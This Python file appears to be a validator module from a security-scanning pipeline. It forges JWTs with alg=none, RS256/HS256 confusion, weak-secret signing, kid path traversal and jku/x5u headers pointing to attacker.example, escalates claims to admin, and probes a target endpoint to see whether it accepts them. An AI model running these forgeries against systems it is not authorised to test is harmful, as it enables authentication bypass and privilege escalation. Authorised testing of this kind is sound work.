from __future__ import annotations

import base64
import json
from typing import Any, Dict, List, Optional

import requests

from modules.pipeline.brain.fact_store import FactStore
from modules.pipeline.engine.models import Evidence, ExecutionContext, ValidationResult

try:
    import jwt as pyjwt  # PyJWT
except Exception:  # pragma: no cover
    pyjwt = None  # type: ignore

try:
    from jose import jwt as jose_jwt  # python-jose
except Exception:  # pragma: no cover
    jose_jwt = None  # type: ignore


class JWTValidator:
    SIGNALS = {
        "header_patterns": ["Authorization: Bearer", "jwt", "access_token"],
        "facts": ["jwt_detected"],
    }
    validator_id = "jwt_validator"
    priority = 95

    def __init__(self, context: Optional[ExecutionContext] = None):
        self.context = context
        self.destructive = False

    def can_run(self, state: Dict[str, Any]) -> bool:
        patterns = [str(x).lower() for x in (state.get("header_patterns") or [])]
        facts = [str(x).lower() for x in (state.get("facts") or [])]
        return any("bearer" in p or "jwt" in p for p in patterns) or "jwt_detected" in facts

    def _extract_token(self, state: Dict[str, Any]) -> Optional[str]:
        token = state.get("jwt") or state.get("access_token")
        if isinstance(token, str) and token.count(".") >= 2:
            return token

        headers = state.get("headers") or {}
        if isinstance(headers, dict):
            auth = headers.get("Authorization") or headers.get("authorization")
            if isinstance(auth, str) and auth.lower().startswith("bearer "):
                candidate = auth.split(" ", 1)[1].strip()
                if candidate.count(".") >= 2:
                    return candidate

        cookie = state.get("cookie")
        if isinstance(cookie, str):
            for piece in cookie.split(";"):
                if "=" not in piece:
                    continue
                _, value = piece.split("=", 1)
                value = value.strip()
                if value.count(".") >= 2:
                    return value

        return None

    def _decode_unverified_claims(self, token: str) -> Dict[str, Any]:
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return {}
            payload = parts[1] + "=" * (-len(parts[1]) % 4)
            decoded = base64.urlsafe_b64decode(payload.encode("utf-8"))
            data = json.loads(decoded.decode("utf-8", errors="ignore"))
            return data if isinstance(data, dict) else {}
        except Exception:
            return {}

    def _forge_candidates(self, token: str) -> List[Dict[str, str]]:
        claims = self._decode_unverified_claims(token)
        if not claims:
            claims = {"sub": "admin", "role": "admin"}
        claims.setdefault("role", "admin")

        candidates: List[Dict[str, str]] = []

        # 1) alg=none
        none_token = self._forge_alg_none(token, claims)
        if none_token:
            candidates.append({"name": "alg_none", "token": none_token})

        # 2) RS256 -> HS256 confusion (best effort with placeholder key material)
        if pyjwt is not None:
            try:
                hs256_confused = pyjwt.encode(claims, "PUBLIC_KEY_PLACEHOLDER", algorithm="HS256")
                candidates.append({"name": "rs256_hs256_confusion", "token": hs256_confused})
            except Exception:
                pass

        # 3) weak secret brute force (top list subset)
        weak_secrets = ["secret", "changeme", "admin", "password", "jwtsecret", "123456"]
        if pyjwt is not None:
            for secret in weak_secrets:
                try:
                    weak_token = pyjwt.encode(claims, secret, algorithm="HS256")
                    candidates.append({"name": f"weak_secret:{secret}", "token": weak_token})
                except Exception:
                    continue

        # 4) kid traversal header
        if pyjwt is not None:
            try:
                kid_token = pyjwt.encode(
                    claims,
                    "ignored",
                    algorithm="HS256",
                    headers={"kid": "../../../../dev/null"},
                )
                candidates.append({"name": "kid_path_traversal", "token": kid_token})
            except Exception:
                pass

        # 5) jku/x5u header injection
        if pyjwt is not None:
            try:
                jku_token = pyjwt.encode(
                    claims,
                    "ignored",
                    algorithm="HS256",
                    headers={"jku": "https://attacker.example/jwks.json", "x5u": "https://attacker.example/x5u"},
                )
                candidates.append({"name": "jku_x5u_injection", "token": jku_token})
            except Exception:
                pass

        if jose_jwt is not None:
            try:
                jose_token = jose_jwt.encode(claims, "secret", algorithm="HS256")
                candidates.append({"name": "python_jose_hs256", "token": jose_token})
            except Exception:
                pass

        return candidates

    def _forge_alg_none(self, token: str, claims: Dict[str, Any]) -> Optional[str]:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        try:
            header = {"alg": "none", "typ": "JWT"}
            encoded_header = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).decode().rstrip("=")
            encoded_payload = base64.urlsafe_b64encode(json.dumps(claims, separators=(",", ":")).encode()).decode().rstrip("=")
            return f"{encoded_header}.{encoded_payload}."
        except Exception:
            return None

    def run(self, state: Dict[str, Any]):
        token = self._extract_token(state)
        target = state.get("protected_endpoint") or state.get("url") or state.get("target")
        if not isinstance(target, str) or not target:
            return None

        if not token:
            return ValidationResult(
                success=False,
                confidence=0.0,
                severity="info",
                vulnerability="jwt-missing-token",
                evidence=Evidence(request={"target": target}, response="No JWT token discovered", matched=""),
            )

        timeout = int(state.get("timeout", 8) or 8)
        ua = {"User-Agent": "security-pipeline-validator/1.0"}

        try:
            baseline = requests.get(target, headers=ua, timeout=timeout, allow_redirects=False)
        except Exception as exc:
            return ValidationResult(
                success=False,
                confidence=0.0,
                severity="info",
                vulnerability="jwt-baseline-failed",
                evidence=Evidence(request={"target": target}, response=str(exc), matched=""),
            )

        forged_candidates = self._forge_candidates(token)
        for forged in forged_candidates:
            forged_token = forged.get("token")
            if not forged_token:
                continue

            headers = dict(ua)
            headers["Authorization"] = f"Bearer {forged_token}"
            try:
                probe = requests.get(target, headers=headers, timeout=timeout, allow_redirects=False)
            except Exception:
                continue

            baseline_denied = baseline.status_code in {401, 403}
            accepted = probe.status_code == 200 and baseline_denied
            if accepted:
                store = state.get("fact_store") if isinstance(state.get("fact_store"), FactStore) else FactStore()
                store.add_confirmed_vulnerability(
                    vuln_id="jwt_forged",
                    vuln_type="jwt_forged",
                    target=target,
                    source_validator_id=self.validator_id,
                    metadata={"method": forged.get("name"), "baseline_status": baseline.status_code, "probe_status": probe.status_code},
                )
                return ValidationResult(
                    success=True,
                    confidence=0.97,
                    severity="critical",
                    vulnerability="jwt-forgery",
                    evidence=Evidence(
                        request={"target": target, "method": forged.get("name")},
                        response={"baseline_status": baseline.status_code, "probe_status": probe.status_code},
                        matched=forged.get("name", ""),
                    ),
                    impact="Server accepted a forged JWT and granted access to a protected endpoint.",
                    remediation="Enforce strict algorithm validation, key management, kid/jku allowlists, and reject unsigned tokens.",
                )

        return ValidationResult(
            success=False,
            confidence=0.2,
            severity="info",
            vulnerability="jwt-forgery",
            evidence=Evidence(
                request={"target": target, "tests": [c.get("name") for c in forged_candidates]},
                response={"baseline_status": baseline.status_code},
                matched="",
            ),
        )
